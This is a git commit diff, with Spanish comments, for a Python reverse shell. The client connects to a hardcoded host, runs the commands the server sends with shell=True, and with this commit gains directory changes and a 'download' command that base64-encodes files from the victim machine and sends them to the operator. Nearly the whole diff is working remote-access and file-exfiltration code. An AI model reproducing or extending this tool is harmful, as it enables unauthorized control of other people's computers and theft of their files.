92e2becb51130e32aa3586c801b09e9077a39533
atomarxculo <59341311+atomarxculo@users.noreply.github.com>
2020-02-07 17:34:37 +0100

    Descarga de ficheros
    Podemos cambiar de directorio y descargar ficheros del equipo cliente

--- client.py
+++ client.py
@@ -4,18 +4,33 @@
 import socket
 import os
 import subprocess
+import base64
 
 def shell():
     current_dir = os.getcwd()
     cliente.send(current_dir)
     while True:
-        res = cliente.recv(1024)
-        if res == "exit":
-           break
-        else:
-           proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-           result = proc.stdout.read() + proc.stderr.read()
-           cliente.send(result)
+      res = cliente.recv(1024)
+      if res == "exit":
+         break
+      # Comprueba lo que hay después del cd, sigue ejecutando cmd y ejecuta el comando al cliente que se ha mandado desde el servidor
+      elif res[:2] == "cd" and len(res) > 2:
+         os.chdir(res[3:])
+         result = os.getcwd()
+         cliente.send(result)
+      # Lee el documento que hayamos seleccionado
+      elif res[:8] == "download":
+         with open(res[9:], 'rb') as file_download:
+            cliente.send(base64.b64encode(file_download.read()))
+      else:
+         # Muestra por la consola del cliente el resultado de un comando o un error si el comando no existe, hay que hacerlo ya que la shell se quedaría colgada
+         proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+         result = proc.stdout.read() + proc.stderr.read()
+         # En comandos como mkdir que no muestra un resultado, manda un 1 al servidor y así poder ejecutandose
+         if len(result) == 0:
+            cliente.send("1")
+         else:
+            cliente.send(result)
 
 cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 cliente.connect(("192.168.1.110", 7777))
--- server.py
+++ server.py
@@ -2,18 +2,39 @@
 # -*- coding: utf-8 -*-
 
 import socket
+import base64
 
 def shell():
 	current_dir = target.recv(1024)
 	while True:
+    	# Cambia el simbolo de la shell
 		comando = raw_input("{}~#: ".format(current_dir))
+		# Si recibe un exit, envía el comando y cierra el bucle
 		if comando == "exit":
 			target.send(comando)
 			break
-		else:
+		# Si recibe cd, envía el comando y actualiza la variable de directorio actual por la ruta que hayamos indicado
+		elif comando[:2] == "cd":
 			target.send(comando)
 			res = target.recv(1024)
-			print(res)
+			current_dir = res
+		# Si recibe un parametro vacío como puede ser un Enter, el bucle sigue corriendo
+		elif comando == "":
+			pass
+		# Si se ejecuta el comando "download", crea un fichero con el mismo nombre que vamos a descargar y escribe los datos encriptados en Base64
+		elif comando[:8] == "download":
+			target.send(comando)
+			with open(comando[9:], 'wb') as file_download:
+				datos = target.recv(30000)
+				file_download.write(base64.b64decode(datos))	
+		else:
+			target.send(comando)
+			res = target.recv(30000)
+			# Recibe el 1 que hemos mandado desde el cliente y continua el bucle
+			if res == "1":
+				continue
+			else:
+				print(res)
 
 def upserver():
 	global server
